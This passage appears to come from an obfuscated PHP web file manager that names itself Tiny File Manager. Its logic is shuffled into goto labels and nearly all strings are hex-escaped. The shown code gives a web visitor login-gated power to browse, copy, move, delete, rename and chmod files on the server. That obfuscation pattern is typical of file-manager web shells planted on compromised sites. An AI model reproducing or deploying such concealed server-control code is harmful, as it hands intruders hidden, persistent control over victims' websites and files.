                    </th><?php  } goto cBQ23; wgNSa: function fm_show_message() { if (isset($_SESSION[FM_SESSION_ID]["\155\145\x73\x73\x61\147\x65"])) { $class = isset($_SESSION[FM_SESSION_ID]["\163\x74\141\x74\165\163"]) ? $_SESSION[FM_SESSION_ID]["\x73\x74\x61\x74\x75\x73"] : "\157\153"; echo "\74\160\40\143\x6c\x61\163\163\75\x22\155\x65\163\163\141\x67\x65\x20" . $class . "\x22\x3e" . $_SESSION[FM_SESSION_ID]["\155\145\163\163\141\x67\x65"] . "\x3c\57\x70\x3e"; unset($_SESSION[FM_SESSION_ID]["\155\145\x73\163\x61\x67\x65"]); unset($_SESSION[FM_SESSION_ID]["\x73\164\x61\164\x75\x73"]); } } goto mHCdb; guvYS: $lang = isset($cfg->data["\154\x61\156\147"]) ? $cfg->data["\x6c\141\156\x67"] : "\145\156"; goto y6015; CxVwW: function fm_get_audio_exts() { return array("\167\x61\x76", "\155\160\x33", "\x6f\147\x67", "\x6d\64\x61"); } goto UoTT2; UnYp8: $use_highlightjs = true; goto X5bBx; Dhyof: $favicon_path = "\x3f\x69\155\x67\75\146\x61\x76\151\x63\157\156"; goto USDWT; uQNH2: if (isset($_GET["\x63\157\160\171"]) && !isset($_GET["\x66\x69\x6e\x69\163\x68"]) && !FM_READONLY) { $copy = $_GET["\x63\x6f\x70\171"]; $copy = fm_clean_path($copy); if ($copy == '' || !file_exists(FM_ROOT_PATH . "\57" . $copy)) { fm_set_msg("\x46\151\154\145\x20\156\x6f\x74\40\x66\x6f\165\156\x64", "\x65\x72\x72\x6f\x72"); fm_redirect(FM_SELF_URL . "\77\x70\x3d" . urlencode(FM_PATH)); } fm_show_header(); fm_show_nav_path(FM_PATH); ?>
    <div class="path">
        <p><b>Copying</b></p>
        <p class="break-word">
            Source path: <?php  echo fm_enc(fm_convert_win(FM_ROOT_PATH . "\x2f" . $copy)); ?>
<br>
            Destination folder: <?php  echo fm_enc(fm_convert_win(FM_ROOT_PATH . "\57" . FM_PATH)); ?>
        </p>
        <p>
            <b><a href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;copy=<?php  echo urlencode($copy); ?>
&amp;finish=1"><i class="fa fa-check-circle"></i> Copy</a></b> &nbsp;
            <b><a href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;copy=<?php  echo urlencode($copy); ?>
&amp;finish=1&amp;move=1"><i class="fa fa-check-circle"></i> Move</a></b> &nbsp;
            <b><a href="?p=<?php  echo urlencode(FM_PATH); ?>
"><i class="fa fa-times-circle"></i> Cancel</a></b>
        </p>
        <p><i>Select folder</i></p>
        <ul class="folders break-word">
            <?php  if ($parent !== false) { ?>
                <li><a href="?p=<?php  echo urlencode($parent); ?>
&amp;copy=<?php  echo urlencode($copy); ?>
"><i class="fa fa-chevron-circle-left"></i> ..</a></li>
                <?php  } foreach ($folders as $f) { ?>
                <li>
                    <a href="?p=<?php  echo urlencode(trim(FM_PATH . "\x2f" . $f, "\57")); ?>
&amp;copy=<?php  echo urlencode($copy); ?>
"><i class="fa fa-folder-o"></i> <?php  echo fm_convert_win($f); ?>
</a></li>
                <?php  } ?>
        </ul>
    </div>
    <?php  fm_show_footer(); die; } goto Nlh5F; S1vRq: function fm_copy($f1, $f2, $upd) { $time1 = filemtime($f1); if (file_exists($f2)) { $time2 = filemtime($f2); if ($time2 >= $time1 && $upd) { return false; } } $ok = copy($f1, $f2); if ($ok) { touch($f2, $time1); } return $ok; } goto wP0pl; AKvW3: function fm_rdelete($path) { if (is_link($path)) { return unlink($path); } elseif (is_dir($path)) { $objects = scandir($path); $ok = true; if (is_array($objects)) { foreach ($objects as $file) { if ($file != "\x2e" && $file != "\56\56") { if (!fm_rdelete($path . "\57" . $file)) { $ok = false; } } } } return $ok ? rmdir($path) : false; } elseif (is_file($path)) { return unlink($path); } return false; } goto UdO2P; TB0Md: echo fm_enc(FM_PATH); goto YOjyC; lqlNU: function fm_get_images() { return array("\x66\141\166\x69\x63\x6f\156" => "\121\x6b\60\x34\x41\x67\101\101\x41\x41\101\101\101\x44\131\x41\101\101\x41\x6f\101\101\x41\101\105\x41\x41\101\101\x42\x41\101\101\101\x41\102\101\x42\101\101\x41\101\x41\x41\x41\x41\111\103\101\101\x41\123\103\x77\x41\101\105\x67\163\101\x41\x41\101\x41\101\x41\101\x41\101\101\x41\x41\x49\x51\x51\150\x42\x43\x45\105\x49\x51\x51\x68\x42\x43\105\105\x49\x51\121\x68\102\103\x45\x45\x49\121\xa\x20\40\40\x20\40\40\40\x20\x51\150\102\x43\x45\105\x49\x51\x51\150\x42\x43\x45\105\x49\121\121\150\102\103\x45\105\x49\x51\121\150\102\110\116\117\x33\156\57\x65\146\71\65\57\x76\130\145\x74\116\123\105\105\x49\121\x51\x68\x42\103\x45\105\111\x51\121\x68\102\x43\105\x45\111\121\x51\150\x42\103\105\x45\x63\x30\67\145\x66\71\65\x2f\x33\156\x2f\x65\146\x39\x35\x2f\61\x6c\157\x68\x42\x43\105\x45\x49\121\x51\150\x42\103\x45\105\x49\x51\x51\x68\102\103\x45\x45\x49\x51\12\40\40\x20\x20\40\x20\x20\40\x52\x7a\124\x74\65\57\63\x6e\x38\150\102\x44\106\107\63\x6e\x2f\145\146\171\x45\x45\111\121\x51\150\x42\103\x45\x45\x49\121\121\150\x42\103\x45\105\x49\x51\121\x68\102\x48\x4e\x4f\x33\x6e\57\x65\x66\x79\x45\x45\115\125\142\x65\146\71\65\57\111\x51\x51\x68\102\103\105\x45\x49\x51\121\x68\x42\103\x45\105\111\x51\x51\150\102\x43\105\105\162\124\x56\x7a\124\156\116\117\x49\121\x51\170\122\x74\65\x2f\63\156\70\x68\102\x43\x45\105\111\121\xa\x20\40\x20\x20\x20\40\x20\x20\121\150\x42\103\105\x45\111\121\x51\x68\x42\x43\105\x45\x49\x51\x51\150\102\x43\105\x45\x49\121\x51\150\x42\104\x46\107\63\156\57\145\146\171\x45\x45\x49\x51\x51\150\102\x43\x45\x45\111\121\x51\150\x42\103\x45\105\111\x51\121\150\102\103\105\x45\111\121\121\170\122\x74\65\x2f\x33\x6e\x2b\143\x63\x32\x73\x74\x49\121\x51\150\x42\x43\x45\x45\111\121\121\x68\102\x43\105\x45\111\x51\121\150\102\103\x45\x45\111\x51\x51\111\111\132\170\172\63\x6e\xa\40\40\40\40\x20\x20\40\x20\57\145\146\x35\x78\x7a\x61\171\x30\150\x42\x43\x45\105\x49\x51\121\x68\102\x43\x45\x45\x49\x51\121\x68\102\x43\x45\x45\x49\x51\121\150\102\x43\105\x45\x49\x51\121\x68\x42\104\x46\107\x33\x6e\x2f\x65\x66\171\105\105\111\121\121\x68\102\103\x45\x45\111\x51\121\x68\x42\103\105\105\x49\121\x51\x68\x42\113\60\61\143\x30\x35\172\124\151\x45\105\x4d\x55\142\x65\146\71\x35\57\111\x51\x51\x68\x42\103\x45\x45\x49\121\x51\150\102\x43\x45\105\111\121\xa\x20\x20\x20\x20\40\40\40\40\x51\150\102\103\105\x45\143\x30\x37\145\146\x39\x35\x2f\x49\x51\x51\x78\122\164\x35\57\x33\156\70\x68\x42\103\105\x45\x49\121\121\150\102\103\105\x45\111\121\121\150\102\x43\x45\x45\111\x51\x52\172\124\164\x35\x2f\63\x6e\70\150\102\104\106\107\x33\x6e\x2f\x65\x66\171\x45\105\111\121\121\150\102\x43\x45\105\111\x51\121\x68\x42\103\105\x45\x49\x51\121\x68\102\113\125\125\117\x57\x66\x65\x66\71\65\57\x33\x6e\57\x65\146\x39\x35\57\111\121\xa\x20\x20\x20\40\x20\x20\x20\x20\121\x68\102\103\x45\105\x49\121\121\x68\x42\x43\x45\105\x49\121\x51\x68\102\103\x45\x45\x49\121\121\150\x42\112\122\x57\63\x6e\57\x65\146\71\65\x2f\63\x6e\70\150\x42\x43\105\105\x49\121\x51\150\102\x43\105\x45\111\121\x51\x68\102\x43\x45\105\111\x51\121\x68\102\x43\x45\105\x49\x51\121\x68\102\103\x45\105\x49\121\x51\x68\102\x43\x45\x45\111\121\121\150\102\x43\105\105\x49\x51\x51\101\x41\101\75\x3d"); } goto uA3kc; Ry31U: if ($use_auth) { if (isset($_SESSION[FM_SESSION_ID]["\x6c\157\147\x67\145\x64"], $auth_users[$_SESSION[FM_SESSION_ID]["\x6c\x6f\x67\147\145\x64"]])) { } elseif (isset($_POST["\146\155\x5f\165\x73\x72"], $_POST["\x66\155\x5f\x70\x77\144"])) { sleep(1); if (function_exists("\160\141\x73\163\x77\157\162\x64\137\166\145\162\151\x66\171")) { if (isset($auth_users[$_POST["\x66\x6d\x5f\165\x73\162"]]) && isset($_POST["\146\155\x5f\160\x77\144"]) && password_verify($_POST["\146\x6d\137\160\x77\144"], $auth_users[$_POST["\146\155\137\165\163\x72"]])) { $_SESSION[FM_SESSION_ID]["\154\157\x67\147\x65\x64"] = $_POST["\x66\x6d\x5f\165\x73\162"]; fm_set_msg("\x59\157\165\40\141\162\x65\x20\x6c\x6f\147\x67\145\x64\40\151\156"); fm_redirect(FM_SELF_URL . "\x3f\160\x3d"); } else { unset($_SESSION[FM_SESSION_ID]["\154\x6f\147\x67\x65\144"]); fm_set_msg("\x4c\x6f\x67\151\156\40\146\x61\x69\x6c\145\144\56\40\x49\x6e\166\141\154\x69\144\40\165\x73\145\162\156\141\155\x65\x20\x6f\x72\40\160\x61\x73\163\167\x6f\162\144", "\145\162\x72\x6f\162"); fm_redirect(FM_SELF_URL); } } else { fm_set_msg("\160\x61\x73\x73\167\157\162\144\137\x68\141\163\150\x20\x6e\157\164\x20\x73\165\160\x70\x6f\162\164\x65\x64\54\x20\x55\160\147\x72\x61\x64\145\40\120\110\120\x20\166\x65\162\x73\151\157\156", "\145\162\162\157\x72"); } } else { unset($_SESSION[FM_SESSION_ID]["\154\157\147\x67\x65\x64"]); fm_show_header_login(); fm_show_message(); ?>
        <section class="h-100">
            <div class="container h-100">
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        <div class="brand">
                        </div>
                        <div class="text-center">
                            <h1 class="card-title"><?php  echo APP_TITLE; ?>
</h1>
                        </div>
                        <div class="card fat">
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    <div class="form-group">
                                        <label for="fm_usr"><?php  echo lng("\125\x73\145\162\156\x61\155\145"); ?>
</label>
                                        <input type="text" class="form-control" id="fm_usr" name="fm_usr" required autofocus>
                                    </div>

                                    <div class="form-group">
                                        <label for="fm_pwd"><?php  echo lng("\120\x61\x73\x73\x77\157\162\144"); ?>
</label>
                                        <input type="password" class="form-control" id="fm_pwd" name="fm_pwd" required>
                                    </div>

                                    <div class="form-group">
                                        <div class="custom-checkbox custom-control">
                                            <input type="checkbox" name="remember" id="remember" class="custom-control-input">
                                            <label for="remember" class="custom-control-label"><?php  echo lng("\122\145\x6d\145\155\142\145\162\x4d\145"); ?>
</label>
                                        </div>
                                    </div>

                                    <div class="form-group">
                                        <button type="submit" class="btn btn-success btn-block" role="button">
                                            <?php  echo lng("\x4c\x6f\x67\151\156"); ?>
                                        </button>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <?php  fm_show_footer_login(); die; } } goto Wz7lR; pEIkN: $root_url = fm_clean_path($root_url); goto BbI9H; mDqoS: define("\106\115\x5f\x52\x45\x41\x44\x4f\x4e\114\131", $use_auth && !empty($readonly_users) && isset($_SESSION[FM_SESSION_ID]["\x6c\x6f\147\x67\145\x64"]) && in_array($_SESSION[FM_SESSION_ID]["\x6c\157\x67\x67\x65\x64"], $readonly_users)); goto MRvdE; Fui2x: $ip_ruleset = "\117\x46\106"; goto jGlHt; paX9p: if (isset($_POST["\143\150\x6d\x6f\x64"]) && !FM_READONLY && !FM_IS_WIN) { $path = FM_ROOT_PATH; if (FM_PATH != '') { $path .= "\57" . FM_PATH; } $file = $_POST["\143\150\x6d\157\144"]; $file = fm_clean_path($file); $file = str_replace("\57", '', $file); if ($file == '' || !is_file($path . "\x2f" . $file) && !is_dir($path . "\x2f" . $file)) { fm_set_msg("\106\151\154\145\40\156\157\164\x20\146\x6f\x75\x6e\144", "\145\162\162\x6f\x72"); fm_redirect(FM_SELF_URL . "\x3f\x70\x3d" . urlencode(FM_PATH)); } $mode = 0; if (!empty($_POST["\165\162"])) { $mode |= 256; } if (!empty($_POST["\165\x77"])) { $mode |= 128; } if (!empty($_POST["\165\x78"])) { $mode |= 64; } if (!empty($_POST["\x67\162"])) { $mode |= 32; } if (!empty($_POST["\147\x77"])) { $mode |= 16; } if (!empty($_POST["\147\x78"])) { $mode |= 8; } if (!empty($_POST["\157\162"])) { $mode |= 4; } if (!empty($_POST["\x6f\x77"])) { $mode |= 2; } if (!empty($_POST["\157\x78"])) { $mode |= 1; } if (@chmod($path . "\57" . $file, $mode)) { fm_set_msg("\x50\x65\162\x6d\151\163\163\x69\157\156\x73\40\143\x68\x61\156\147\145\x64"); } else { fm_set_msg("\120\145\x72\x6d\151\163\163\151\x6f\156\163\x20\x6e\x6f\x74\40\143\x68\141\x6e\x67\145\144", "\x65\162\162\x6f\x72"); } fm_redirect(FM_SELF_URL . "\77\x70\x3d" . urlencode(FM_PATH)); } goto KuHON; h7Fii: function get_absolute_path($path) { $path = str_replace(array("\x2f", "\x5c"), DIRECTORY_SEPARATOR, $path); $parts = array_filter(explode(DIRECTORY_SEPARATOR, $path), "\x73\164\162\154\145\156"); $absolutes = array(); foreach ($parts as $part) { if ("\x2e" == $part) { continue; } if ("\56\x2e" == $part) { array_pop($absolutes); } else { $absolutes[] = $part; } } return implode(DIRECTORY_SEPARATOR, $absolutes); } goto GUZQk; jywIK: echo lng("\116\x61\x6d\145"); goto aRgjH; adeg_: define("\106\x4d\x5f\120\x41\124\x48", $p); goto Eterv; hbJVm: function fm_show_footer_login() { ?>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.slim.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
</body>
</html>
<?php  } goto gW_bP; vyYAJ: $all_files_size = 0; goto mxXAo; Uzr5s: if (!@is_dir($root_path)) { echo "\x3c\x68\61\x3e\x52\157\x6f\x74\x20\160\x61\x74\x68\x20\42{$root_path}\x22\x20\156\157\164\40\146\157\165\x6e\x64\41\74\x2f\x68\x31\x3e"; die; } goto l6eQi; hCqhf: function fm_rename($old, $new) { $allowed = FM_EXTENSION ? explode("\54", FM_EXTENSION) : false; $ext = pathinfo($new, PATHINFO_EXTENSION); $isFileAllowed = $allowed ? in_array($ext, $allowed) : true; if (!$isFileAllowed) { return false; } return !file_exists($new) && file_exists($old) ? rename($old, $new) : null; } goto p6zdD; jMr_V: $http_host = $_SERVER["\x48\124\x54\x50\x5f\110\117\123\x54"]; goto zBKs0; DopAP: foreach ($folders as $f) { $is_link = is_link($path . "\x2f" . $f); $img = $is_link ? "\151\x63\157\156\x2d\154\151\156\153\137\x66\157\154\x64\145\162" : "\146\x61\40\146\141\x2d\x66\157\x6c\x64\x65\x72\55\x6f"; $modif = date(FM_DATETIME_FORMAT, filemtime($path . "\57" . $f)); $perms = substr(decoct(fileperms($path . "\57" . $f)), -4); if (function_exists("\x70\157\163\x69\170\137\147\145\x74\x70\167\x75\x69\x64") && function_exists("\x70\157\x73\x69\x78\x5f\147\x65\164\x67\162\x67\x69\144")) { $owner = posix_getpwuid(fileowner($path . "\x2f" . $f)); $group = posix_getgrgid(filegroup($path . "\x2f" . $f)); } else { $owner = array("\156\x61\x6d\x65" => "\77"); $group = array("\156\x61\x6d\145" => "\77"); } ?>
                <tr>
                    <?php  if (!FM_READONLY) { ?>
                        <td class="custom-checkbox-td">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="<?php  echo $ii; ?>
" name="file[]" value="<?php  echo fm_enc($f); ?>
">
                            <label class="custom-control-label" for="<?php  echo $ii; ?>
"></label>
                        </div>
                        </td><?php  } ?>
                    <td>
                        <div class="filename"><a href="?p=<?php  echo urlencode(trim(FM_PATH . "\57" . $f, "\x2f")); ?>
"><i class="<?php  echo $img; ?>
"></i> <?php  echo fm_convert_win($f); ?>
                            </a><?php  echo $is_link ? "\x20\46\162\141\x72\162\73\40\74\151\76" . readlink($path . "\x2f" . $f) . "\x3c\x2f\x69\76" : ''; ?>
</div>
                    </td>
                    <td><?php  echo lng("\106\157\154\144\145\162"); ?>
</td>
                    <td><?php  echo $modif; ?>
</td>
                    <?php  if (!FM_IS_WIN) { ?>
                        <td><?php  if (!FM_READONLY) { ?>
<a title="Change Permissions" href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;chmod=<?php  echo urlencode($f); ?>
"><?php  echo $perms; ?>
</a><?php  } else { echo $perms; } ?>
                        </td>
                        <td><?php  echo $owner["\x6e\x61\x6d\145"] . "\x3a" . $group["\156\x61\x6d\x65"]; ?>
</td>
                    <?php  } ?>
                    <td class="inline-actions"><?php  if (!FM_READONLY) { ?>
                            <a title="<?php  echo lng("\104\145\x6c\x65\164\145"); ?>
" href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;del=<?php  echo urlencode($f); ?>
" onclick="return confirm('Delete folder?');"><i class="fa fa-trash-o" aria-hidden="true"></i></a>
                            <a title="<?php  echo lng("\122\x65\x6e\x61\155\x65"); ?>
" href="#" onclick="rename('<?php  echo fm_enc(FM_PATH); ?>
', '<?php  echo fm_enc(addslashes($f)); ?>
');return false;"><i class="fa fa-pencil-square-o" aria-hidden="true"></i></a>
                            <a title="<?php  echo lng("\103\157\x70\171\124\x6f"); ?>
..." href="?p=&amp;copy=<?php  echo urlencode(trim(FM_PATH . "\x2f" . $f, "\57")); ?>
"><i class="fa fa-files-o" aria-hidden="true"></i></a>
                        <?php  } ?>
                        <a title="<?php  echo lng("\x44\x69\x72\145\x63\x74\x4c\151\156\153"); ?>
" href="<?php  echo fm_enc(FM_ROOT_URL . (FM_PATH != '' ? "\57" . FM_PATH : '') . "\57" . $f . "\x2f"); ?>
" target="_blank"><i class="fa fa-link" aria-hidden="true"></i></a>
                    </td>
                </tr>
                <?php  flush(); $ii++; } goto u1pQF; QP0qe: $ii = 3399; goto DopAP; s7nUd: foreach ($files as $f) { $is_link = is_link($path . "\x2f" . $f); $img = $is_link ? "\146\141\x20\146\x61\x2d\146\151\x6c\145\55\x74\x65\170\x74\55\x6f" : fm_get_file_icon_class($path . "\x2f" . $f); $modif = date(FM_DATETIME_FORMAT, filemtime($path . "\x2f" . $f)); $filesize_raw = fm_get_size($path . "\x2f" . $f); $filesize = fm_get_filesize($filesize_raw); $filelink = "\x3f\x70\75" . urlencode(FM_PATH) . "\46\x61\155\160\x3b\166\x69\145\x77\x3d" . urlencode($f); $all_files_size += $filesize_raw; $perms = substr(decoct(fileperms($path . "\57" . $f)), -4); if (function_exists("\x70\157\163\151\170\137\147\x65\x74\x70\167\165\x69\144") && function_exists("\x70\157\x73\x69\x78\x5f\147\145\164\147\162\147\151\144")) { $owner = posix_getpwuid(fileowner($path . "\x2f" . $f)); $group = posix_getgrgid(filegroup($path . "\x2f" . $f)); } else { $owner = array("\x6e\141\x6d\x65" => "\x3f"); $group = array("\156\x61\x6d\145" => "\77"); } ?>
                <tr>
                    <?php  if (!FM_READONLY) { ?>
                        <td class="custom-checkbox-td">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="<?php  echo $ik; ?>
" name="file[]" value="<?php  echo fm_enc($f); ?>
">
                            <label class="custom-control-label" for="<?php  echo $ik; ?>
"></label>
                        </div>
                        </td><?php  } ?>
                    <td>
                        <div class="filename"><a href="<?php  echo $filelink; ?>
" title="File info"><i class="<?php  echo $img; ?>
"></i> <?php  echo fm_convert_win($f); ?>
                            </a><?php  echo $is_link ? "\40\x26\162\141\x72\x72\73\x20\x3c\151\x3e" . readlink($path . "\x2f" . $f) . "\x3c\57\x69\76" : ''; ?>
</div>
                    </td>
                    <td><span title="<?php  printf("\x25\163\40\x62\x79\x74\x65\163", $filesize_raw); ?>
"><?php  echo $filesize; ?>
</span></td>
                    <td><?php  echo $modif; ?>
</td>
                    <?php  if (!FM_IS_WIN) { ?>
                        <td><?php  if (!FM_READONLY) { ?>
<a title="<?php  echo "\103\150\x61\156\147\x65\x20\x50\x65\162\x6d\151\x73\x73\x69\157\156\163"; ?>
" href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;chmod=<?php  echo urlencode($f); ?>
"><?php  echo $perms; ?>
</a><?php  } else { echo $perms; } ?>
                        </td>
                        <td><?php  echo fm_enc($owner["\x6e\x61\x6d\x65"] . "\72" . $group["\x6e\x61\x6d\x65"]); ?>
</td>
                    <?php  } ?>
                    <td class="inline-actions">
                        <?php  if (!FM_READONLY) { ?>
                            <a title="<?php  echo lng("\x50\162\145\166\151\145\167"); ?>
" href="<?php  echo $filelink . "\46\x71\x75\x69\x63\x6b\x56\x69\145\x77\75\x31"; ?>
" data-toggle="lightbox" data-gallery="tiny-gallery" data-title="<?php  echo fm_convert_win($f); ?>
" data-max-width="100%" data-width="100%"><i class="fa fa-eye"></i></a>
                            <a title="<?php  echo lng("\x44\x65\154\x65\164\145"); ?>
" href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;del=<?php  echo urlencode($f); ?>
" onclick="return confirm('Delete file?');"><i class="fa fa-trash-o"></i></a>
                            <a title="<?php  echo lng("\122\x65\x6e\141\155\x65"); ?>
" href="#" onclick="rename('<?php  echo fm_enc(FM_PATH); ?>
', '<?php  echo fm_enc(addslashes($f)); ?>
');return false;"><i class="fa fa-pencil-square-o"></i></a>
                            <a title="<?php  echo lng("\103\x6f\x70\171\x54\157"); ?>
..."
                               href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;copy=<?php  echo urlencode(trim(FM_PATH . "\x2f" . $f, "\x2f")); ?>
"><i class="fa fa-files-o"></i></a>
                        <?php  } ?>
                        <a title="<?php  echo lng("\104\x69\162\x65\143\x74\114\151\156\x6b"); ?>
" href="<?php  echo fm_enc(FM_ROOT_URL . (FM_PATH != '' ? "\x2f" . FM_PATH : '') . "\57" . $f); ?>
" target="_blank"><i class="fa fa-link"></i></a>
                        <a title="<?php  echo lng("\104\x6f\167\x6e\154\157\x61\144"); ?>
" href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;dl=<?php  echo urlencode($f); ?>
"><i class="fa fa-download"></i></a>
                    </td>
                </tr>
                <?php  flush(); $ik++; } goto ysOps; w18Yk: define("\126\x45\122\x53\x49\x4f\x4e", "\62\x2e\63\56\x36"); goto Z2yVc; BbI9H: defined("\106\115\137\x52\117\117\x54\137\125\122\114") || define("\106\x4d\x5f\x52\x4f\x4f\x54\137\x55\x52\x4c", ($is_https ? "\150\x74\164\x70\163" : "\150\x74\x74\160") . "\x3a\57\x2f" . $http_host . (!empty($root_url) ? "\x2f" . $root_url : '')); goto U8934; UBUSr: function fm_object_to_array($obj) { if (!is_object($obj) && !is_array($obj)) { return $obj; } if (is_object($obj)) { $obj = get_object_vars($obj); } return array_map("\x66\155\137\157\142\152\x65\143\164\x5f\x74\x6f\x5f\x61\x72\162\x61\x79", $obj); } goto LmfeZ; LL7OD: function lng($txt) { global $lang; $tr["\x65\x6e"]["\x41\160\160\116\x61\x6d\145"] = "\124\x69\x6e\x79\40\106\151\154\x65\x20\x4d\x61\156\x61\147\x65\162"; $tr["\145\156"]["\101\160\x70\x54\151\164\154\145"] = "\106\151\154\145\x20\x4d\x61\156\141\x67\x65\x72"; $tr["\145\x6e"]["\x4c\x6f\x67\x69\x6e"] = "\123\x69\147\x6e\40\151\x6e"; $tr["\x65\x6e"]["\125\x73\x65\x72\x6e\141\155\x65"] = "\125\163\x65\x72\x6e\x61\155\x65"; $tr["\x65\x6e"]["\120\141\163\163\167\157\x72\x64"] = "\x50\141\x73\163\167\157\162\144"; $tr["\145\x6e"]["\x4c\x6f\x67\x6f\x75\164"] = "\x53\151\147\x6e\x20\x4f\165\164"; $tr["\145\156"]["\115\x6f\166\x65"] = "\115\x6f\x76\145"; $tr["\x65\156"]["\103\157\x70\171"] = "\103\x6f\x70\x79"; $tr["\x65\156"]["\123\x61\x76\x65"] = "\x53\x61\x76\x65"; $tr["\145\156"]["\123\145\x6c\x65\x63\x74\x41\x6c\x6c"] = "\123\145\154\145\143\x74\x20\x61\154\154"; $tr["\x65\156"]["\x55\x6e\x53\x65\x6c\x65\x63\164\x41\154\154"] = "\125\x6e\x73\145\154\x65\143\x74\40\x61\154\154"; $tr["\x65\x6e"]["\106\151\x6c\145"] = "\106\151\x6c\x65"; $tr["\x65\x6e"]["\102\141\143\x6b"] = "\x42\141\x63\153"; $tr["\x65\x6e"]["\x53\151\x7a\x65"] = "\x53\151\172\x65"; $tr["\x65\x6e"]["\x50\145\162\155\163"] = "\x50\x65\162\x6d\x73"; $tr["\x65\x6e"]["\115\157\144\x69\x66\x69\x65\x64"] = "\115\157\144\x69\146\151\145\144"; $tr["\x65\156"]["\x4f\167\156\x65\162"] = "\x4f\x77\x6e\145\162"; $tr["\145\x6e"]["\x53\145\141\x72\143\x68"] = "\x53\x65\x61\x72\143\150"; $tr["\x65\x6e"]["\116\145\167\x49\164\145\155"] = "\116\x65\x77\x20\x49\164\145\155"; $tr["\145\156"]["\106\x6f\154\144\145\162"] = "\106\157\x6c\x64\x65\x72"; $tr["\145\x6e"]["\104\x65\x6c\x65\x74\x65"] = "\x44\145\154\145\164\145"; $tr["\145\156"]["\x52\145\x6e\141\155\145"] = "\122\x65\x6e\x61\155\x65"; $tr["\145\x6e"]["\x43\157\160\171\x54\157"] = "\x43\x6f\x70\x79\40\164\x6f"; $tr["\145\x6e"]["\x44\151\162\x65\x63\164\x4c\151\x6e\x6b"] = "\x44\x69\x72\x65\143\x74\40\x6c\x69\x6e\153"; $tr["\145\x6e"]["\125\x70\x6c\x6f\141\144\151\156\x67\x46\x69\154\145\x73"] = "\125\x70\x6c\x6f\141\x64\x20\x46\x69\x6c\145\x73"; $tr["\145\x6e"]["\x43\150\x61\x6e\x67\145\x50\145\x72\x6d\151\163\x73\151\x6f\x6e\163"] = "\x43\150\141\156\147\145\40\x50\145\162\x6d\151\x73\163\151\157\156\x73"; $tr["\x65\156"]["\103\157\160\x79\x69\x6e\147"] = "\103\x6f\x70\171\x69\x6e\147"; $tr["\145\x6e"]["\x43\x72\145\141\x74\x65\x4e\145\x77\111\164\145\x6d"] = "\103\162\145\141\x74\x65\x20\116\145\x77\x20\x49\164\x65\x6d"; $tr["\x65\x6e"]["\116\x61\155\x65"] = "\116\x61\155\145"; $tr["\145\x6e"]["\101\144\166\x61\x6e\x63\x65\144\x45\144\151\164\157\x72"] = "\x41\x64\x76\x61\x6e\143\145\144\x20\x45\x64\x69\164\157\162"; $tr["\x65\x6e"]["\122\145\155\x65\x6d\x62\145\x72\x4d\x65"] = "\x52\145\x6d\145\155\142\145\x72\40\115\145"; $tr["\145\156"]["\101\x63\164\151\157\156\x73"] = "\x41\x63\164\x69\x6f\x6e\x73"; $tr["\145\x6e"]["\125\160\x6c\157\x61\x64"] = "\x55\x70\154\157\x61\x64"; $tr["\145\x6e"]["\x43\141\156\x63\x65\x6c"] = "\x43\141\x6e\x63\145\154"; $tr["\145\x6e"]["\x49\156\166\x65\162\x74\x53\x65\x6c\x65\143\x74\151\x6f\x6e"] = "\x49\156\x76\x65\162\x74\x20\x53\145\x6c\x65\143\x74\151\x6f\x6e"; $tr["\x65\156"]["\x44\145\163\x74\x69\156\141\164\x69\x6f\156\x46\157\x6c\x64\x65\162"] = "\x44\x65\x73\164\x69\x6e\141\164\x69\157\156\40\x46\157\154\x64\145\x72"; $tr["\145\156"]["\111\x74\145\155\124\x79\160\x65"] = "\111\x74\145\155\x20\124\x79\160\145"; $tr["\x65\x6e"]["\x49\x74\145\x6d\116\141\155\x65"] = "\111\164\145\x6d\x20\x4e\141\155\145"; $tr["\145\x6e"]["\103\x72\x65\x61\164\x65\116\x6f\x77"] = "\x43\162\x65\x61\x74\145\x20\x4e\x6f\x77"; $tr["\x65\156"]["\x44\157\x77\156\154\157\x61\144"] = "\104\157\x77\x6e\x6c\157\141\x64"; $tr["\145\x6e"]["\117\160\x65\x6e"] = "\117\160\145\156"; $tr["\x65\x6e"]["\125\156\132\x69\160"] = "\x55\156\132\x69\x70"; $tr["\145\x6e"]["\x55\x6e\x5a\x69\x70\x54\x6f\x46\x6f\154\x64\x65\x72"] = "\x55\x6e\x5a\x69\x70\x20\x74\x6f\x20\146\157\x6c\x64\145\162"; $tr["\145\x6e"]["\x45\x64\151\164"] = "\105\144\151\164"; $tr["\145\x6e"]["\x4e\157\x72\155\141\154\105\x64\x69\x74\157\162"] = "\116\x6f\x72\155\x61\x6c\40\105\x64\151\x74\x6f\x72"; $tr["\145\x6e"]["\x42\x61\x63\153\125\x70"] = "\x42\x61\x63\x6b\40\125\x70"; $tr["\x65\156"]["\123\x6f\165\162\x63\145\106\157\x6c\144\x65\x72"] = "\x53\157\165\162\143\145\x20\x46\x6f\154\144\145\x72"; $tr["\145\156"]["\x46\151\x6c\145\x73"] = "\106\x69\154\x65\163"; $tr["\145\156"]["\x4d\x6f\x76\x65"] = "\x4d\157\x76\x65"; $tr["\145\156"]["\x43\150\x61\156\147\x65"] = "\x43\x68\141\156\x67\145"; $tr["\x65\x6e"]["\x53\145\x74\x74\x69\156\147\x73"] = "\123\x65\x74\x74\x69\156\147\x73"; $tr["\x65\156"]["\x4c\141\156\147\x75\141\147\x65"] = "\x4c\x61\x6e\x67\165\x61\147\x65"; $tr["\145\156"]["\115\x65\155\157\162\171\125\x73\145\144"] = "\115\145\155\157\162\x79\x20\x75\163\145\144"; 